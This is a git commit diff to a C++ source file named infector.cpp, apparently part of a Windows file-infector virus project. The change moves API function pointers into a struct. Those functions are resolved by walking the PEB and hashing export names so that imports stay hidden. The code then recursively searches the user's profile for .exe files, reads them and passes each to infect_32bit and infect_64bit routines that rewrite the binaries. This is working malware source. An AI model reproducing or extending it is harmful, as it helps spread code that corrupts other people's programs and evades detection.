a583238d029bd369b18f0a97be706d4220d4b4e2
frank2 <frank2@dc949.org>
2024-01-03 00:39:44 -0800

    moar imports

--- src/infector.cpp
+++ src/infector.cpp
@@ -53,9 +53,6 @@ typedef struct FULL_LDR_DATA_TABLE_ENTRY
      LIST_ENTRY StaticLinks;
 } FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;
 
-typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
-typedef DWORD (* GetTempPath2AHeader)(DWORD, LPSTR);
-typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
 typedef void * (* mallocHeader)(std::size_t);
 typedef void * (* reallocHeader)(void *, std::size_t);
 typedef void (* freeHeader)(void *);
@@ -63,11 +60,42 @@ typedef char * (* strncatHeader)(char *, const char *, std::size_t);
 typedef int (* strnicmpHeader)(const char *, const char *, std::size_t);
 typedef std::size_t (* strlenHeader)(const char *);
 typedef void * (* memcpyHeader)(void *, const void *, std::size_t);
+typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
+typedef DWORD (* GetTempPath2AHeader)(DWORD, LPSTR);
+typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
+typedef HANDLE (* CreateFileAHeader)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+typedef DWORD (* GetFileSizeHeader)(HANDLE, LPDWORD);
+typedef BOOL (* ReadFileHeader)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+typedef BOOL (* CloseHandleHeader)(HANDLE);
 typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
 typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
 typedef HRESULT (__stdcall *SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);
 typedef HINSTANCE (*ShellExecuteAHeader)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
 typedef HRESULT (__stdcall *URLDownloadToFileHeader)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
+
+struct InfectorIAT
+{
+   /* msvcrt */
+   mallocHeader malloc;
+   reallocHeader realloc;
+   freeHeader free;
+   strncatHeader strncat;
+   strnicmpHeader strnicmp;
+   strlenHeader strlen;
+   memcpyHeader memcpy;
+
+   /* kernel32 */
+   LoadLibraryAHeader loadLibrary;
+   FindFirstFileAHeader findFirstFile;
+   FindNextFileAHeader findNextFile;
+   CreateFileAHeader createFile;
+   GetFileSizeHeader getFileSize;
+   ReadFileHeader readFile;
+   CloseHandleHeader closeHandle;
+
+   /* shell32 */
+   SHGetFolderPathAHeader getFolderPath;
+};
 
 std::uint32_t fnv321a(const char *string)
 {
@@ -154,8 +182,11 @@ PIMAGE_DOS_HEADER infect_64bit(PIMAGE_DOS_HEADER module)
    return nullptr;
 }
 
-int infect(void)
+void load_infector_iat(InfectorIAT *iat)
 {
+   if (iat == nullptr)
+      return;
+
 #if defined(BROODSAC32)
    PPEB peb = reinterpret_case<PPEB>(__readfsdword(0x30));
 #elif defined(BROODSAC64)
@@ -165,34 +196,46 @@ int infect(void)
    PFULL_PEB_LDR_DATA ldr = reinterpret_cast<PFULL_PEB_LDR_DATA>(peb->Ldr);
    PFULL_LDR_DATA_TABLE_ENTRY list_entry = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(ldr->InLoadOrderModuleList.Flink);
    PFULL_LDR_DATA_TABLE_ENTRY kernel32 = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink);
-   LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
-   FindFirstFileAHeader findFirstFile = reinterpret_cast<FindFirstFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xd7482f55));
-   FindNextFileAHeader findNextFile = reinterpret_cast<FindNextFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x6f4d1398));
+   iat->loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
+   iat->findFirstFile = reinterpret_cast<FindFirstFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xd7482f55));
+   iat->findNextFile = reinterpret_cast<FindNextFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x6f4d1398));
+   std::cout << "CreateFileA: " << std::hex << fnv321a("CreateFileA") << std::endl;
+   std::cout << "GetFileSize: " << std::hex << fnv321a("GetFileSize") << std::endl;
+   std::cout << "ReadFile: " << std::hex << fnv321a("ReadFile") << std::endl;
+   std::cout << "CloseHandle: " << std::hex << fnv321a("CloseHandle") << std::endl;
    PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary("msvcrt.dll"));
-   mallocHeader malloc = reinterpret_cast<mallocHeader>(get_proc_by_hash(msvcrtModule, 0x558c274d));
-   reallocHeader realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
-   freeHeader free = reinterpret_cast<freeHeader>(get_proc_by_hash(msvcrtModule, 0x99b3eedb));
-   strncatHeader strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
-   strnicmpHeader strnicmp = reinterpret_cast<strnicmpHeader>(get_proc_by_hash(msvcrtModule, 0x3b2c5b30));
-   strlenHeader strlen = reinterpret_cast<strlenHeader>(get_proc_by_hash(msvcrtModule, 0x58ba3d97));
-   memcpyHeader memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
+   iat->malloc = reinterpret_cast<mallocHeader>(get_proc_by_hash(msvcrtModule, 0x558c274d));
+   iat->realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
+   iat->free = reinterpret_cast<freeHeader>(get_proc_by_hash(msvcrtModule, 0x99b3eedb));
+   iat->strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
+   iat->strnicmp = reinterpret_cast<strnicmpHeader>(get_proc_by_hash(msvcrtModule, 0x3b2c5b30));
+   iat->strlen = reinterpret_cast<strlenHeader>(get_proc_by_hash(msvcrtModule, 0x58ba3d97));
+   iat->memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
    PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary("shell32.dll"));
-   SHGetFolderPathAHeader getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
+   iat->getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
+}
+
+int infect(void)
+{
+   InfectorIAT iat;
+   load_infector_iat(&iat);
+
+   return 0;
    
    char profile_directory[MAX_PATH+1];
 
-   if (getFolderPath(nullptr, CSIDL_PROFILE, nullptr, 0, profile_directory) != 0)
+   if (iat.getFolderPath(nullptr, CSIDL_PROFILE, nullptr, 0, profile_directory) != 0)
       return 2;
 
    char prepend_path[] = "\\\\?\\";
-   std::size_t root_size = strlen(prepend_path)+strlen(profile_directory)+1;
-   char *search_root = reinterpret_cast<char *>(malloc(root_size));
-   memcpy(search_root, prepend_path, strlen(prepend_path)+1);
-   strncat(search_root, profile_directory, strlen(profile_directory));
+   std::size_t root_size = iat.strlen(prepend_path)+iat.strlen(profile_directory)+1;
+   char *search_root = reinterpret_cast<char *>(iat.malloc(root_size));
+   iat.memcpy(search_root, prepend_path, iat.strlen(prepend_path)+1);
+   iat.strncat(search_root, profile_directory, iat.strlen(profile_directory));
 
    /* create a stack of directory names to traverse */
    std::size_t search_stack_size = 1;
-   char **search_stack = reinterpret_cast<char **>(malloc(sizeof(char *) * search_stack_size));
+   char **search_stack = reinterpret_cast<char **>(iat.malloc(sizeof(char *) * search_stack_size));
    search_stack[0] = search_root;
 
    std::size_t found_executables_size = 0;
@@ -207,21 +250,21 @@ int infect(void)
 
       if (search_stack_size == 0)
       {
-         free(search_stack);
+         iat.free(search_stack);
          search_stack = nullptr;
       }
       else
       {
-         memcpy(&search_stack[0], &search_stack[1], sizeof(char *) * search_stack_size);
-         search_stack = reinterpret_cast<char **>(realloc(search_stack, sizeof(char *) * search_stack_size));
+         iat.memcpy(&search_stack[0], &search_stack[1], sizeof(char *) * search_stack_size);
+         search_stack = reinterpret_cast<char **>(iat.realloc(search_stack, sizeof(char *) * search_stack_size));
       }
 
-      char *search_string = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(starSearch)+1));
-      memcpy(search_string, search_visit, strlen(search_visit)+1);
-      strncat(search_string, starSearch, strlen(starSearch));
+      char *search_string = reinterpret_cast<char *>(iat.malloc(iat.strlen(search_visit)+iat.strlen(starSearch)+1));
+      iat.memcpy(search_string, search_visit, iat.strlen(search_visit)+1);
+      iat.strncat(search_string, starSearch, iat.strlen(starSearch));
       
       WIN32_FIND_DATAA find_data;
-      HANDLE find_handle = findFirstFile(search_string, &find_data);
+      HANDLE find_handle = iat.findFirstFile(search_string, &find_data);
 
       if (find_handle == INVALID_HANDLE_VALUE)
          goto free_and_continue;
@@ -232,46 +275,46 @@ int infect(void)
          char dot[] = ".";
          char dotDot[] = "..";
 
-         if (strnicmp(find_data.cFileName, dot, 2) == 0 || strnicmp(find_data.cFileName, dotDot, 3) == 0)
+         if (iat.strnicmp(find_data.cFileName, dot, 2) == 0 || iat.strnicmp(find_data.cFileName, dotDot, 3) == 0)
             continue;
          else if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10 &&
                   (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0x400) // if directory and not symlink
          {
-            char *new_directory = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(slash)+strlen(find_data.cFileName)+1));
-            memcpy(new_directory, search_visit, strlen(search_visit)+1);
-            strncat(new_directory, slash, strlen(slash));
-            strncat(new_directory, find_data.cFileName, strlen(find_data.cFileName));
+            char *new_directory = reinterpret_cast<char *>(iat.malloc(iat.strlen(search_visit)+iat.strlen(slash)+iat.strlen(find_data.cFileName)+1));
+            iat.memcpy(new_directory, search_visit, iat.strlen(search_visit)+1);
+            iat.strncat(new_directory, slash, iat.strlen(slash));
+            iat.strncat(new_directory, find_data.cFileName, iat.strlen(find_data.cFileName));
 
             ++search_stack_size;
             
             if (search_stack == nullptr)
-               search_stack = reinterpret_cast<char **>(malloc(sizeof(char *) * search_stack_size));
+               search_stack = reinterpret_cast<char **>(iat.malloc(sizeof(char *) * search_stack_size));
             else
-               search_stack = reinterpret_cast<char **>(realloc(search_stack, sizeof(char *) * search_stack_size));
+               search_stack = reinterpret_cast<char **>(iat.realloc(search_stack, sizeof(char *) * search_stack_size));
             
             search_stack[search_stack_size-1] = new_directory;
          }
-         else if (strnicmp(find_data.cFileName+(strlen(find_data.cFileName)-4), exeSearch, strlen(exeSearch)) == 0)
+         else if (iat.strnicmp(find_data.cFileName+(iat.strlen(find_data.cFileName)-4), exeSearch, iat.strlen(exeSearch)) == 0)
          {
-            char *found_executable = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(slash)+strlen(find_data.cFileName)+1));
-            memcpy(found_executable, search_visit, strlen(search_visit)+1);
-            strncat(found_executable, slash, strlen(slash));
-            strncat(found_executable, find_data.cFileName, strlen(find_data.cFileName));
+            char *found_executable = reinterpret_cast<char *>(iat.malloc(iat.strlen(search_visit)+iat.strlen(slash)+iat.strlen(find_data.cFileName)+1));
+            iat.memcpy(found_executable, search_visit, iat.strlen(search_visit)+1);
+            iat.strncat(found_executable, slash, iat.strlen(slash));
+            iat.strncat(found_executable, find_data.cFileName, iat.strlen(find_data.cFileName));
 
             ++found_executables_size;
             
             if (found_executables == nullptr)
-               found_executables = reinterpret_cast<char **>(malloc(sizeof(char *) * found_executables_size));
+               found_executables = reinterpret_cast<char **>(iat.malloc(sizeof(char *) * found_executables_size));
             else
-               found_executables = reinterpret_cast<char **>(realloc(found_executables, sizeof(char *) * found_executables_size));
+               found_executables = reinterpret_cast<char **>(iat.realloc(found_executables, sizeof(char *) * found_executables_size));
 
             found_executables[found_executables_size-1] = found_executable;
          }
-      } while (findNextFile(find_handle, &find_data));
+      } while (iat.findNextFile(find_handle, &find_data));
 
    free_and_continue:
-      free(search_string);
-      free(search_visit);
+      iat.free(search_string);
+      iat.free(search_visit);
    }
 
    std::wcout << found_executables_size << " executables were found." << std::endl;
@@ -279,13 +322,13 @@ int infect(void)
    for (std::size_t i=0; i<found_executables_size; ++i)
    {
       char *executable = found_executables[i];
-      HANDLE exe_handle = CreateFileA(executable,
-                                      GENERIC_READ,
-                                      0,
-                                      nullptr,
-                                      OPEN_EXISTING,
-                                      FILE_ATTRIBUTE_NORMAL,
-                                      nullptr);
+      HANDLE exe_handle = iat.createFile(executable,
+                                         GENERIC_READ,
+                                         0,
+                                         nullptr,
+                                         OPEN_EXISTING,
+                                         FILE_ATTRIBUTE_NORMAL,
+                                         nullptr);
 
       if (exe_handle == INVALID_HANDLE_VALUE)
       {
@@ -293,7 +336,7 @@ int infect(void)
          goto end_exe_loop;
       }
 
-      DWORD file_size = GetFileSize(exe_handle, nullptr);
+      DWORD file_size = iat.getFileSize(exe_handle, nullptr);
 
       if (file_size == INVALID_FILE_SIZE)
       {
@@ -301,10 +344,10 @@ int infect(void)
          goto close_file;
       }
 
-      std::uint8_t *exe_buffer = reinterpret_cast<std::uint8_t *>(malloc(file_size));
+      std::uint8_t *exe_buffer = reinterpret_cast<std::uint8_t *>(iat.malloc(file_size));
       DWORD bytes_read = 0;
 
-      if (!ReadFile(exe_handle, exe_buffer, file_size, &bytes_read, nullptr))
+      if (!iat.readFile(exe_handle, exe_buffer, file_size, &bytes_read, nullptr))
       {
          std::wcout << "\tFailed to read " << executable << std::endl;
          goto free_file;
@@ -317,33 +360,33 @@ int infect(void)
       if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
       {
          std::wcout << "\t" << executable << " is 32-bit." << std::endl;
-         rewritten_image = infect_32bit(dos_header);
+         rewritten_image = infect_32bit(iat, dos_header, file_size);
       }
       else if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
       {
          std::wcout << "\t" << executable << " is 64-bit." << std::endl;
-         rewritten_image = infect_64bit(dos_header);
+         rewritten_image = infect_64bit(iat, dos_header, file_size);
       }
 
       if (rewritten_image != nullptr)
       {
-         CloseHandle(exe_handle);
+         iat.closeHandle(exe_handle);
          exe_handle = INVALID_HANDLE_VALUE;
       }
 
    free_file:
-      free(exe_buffer);
+      iat.free(exe_buffer);
       exe_buffer = nullptr;
 
    close_file:
       if (exe_handle != INVALID_HANDLE_VALUE)
-         CloseHandle(exe_handle);
+         iat.closeHandle(exe_handle);
       
    end_exe_loop:
-      free(found_executables[i]);
+      iat.free(found_executables[i]);
    }
 
-   free(found_executables);
+   iat.free(found_executables);
 
    return 0;
 }
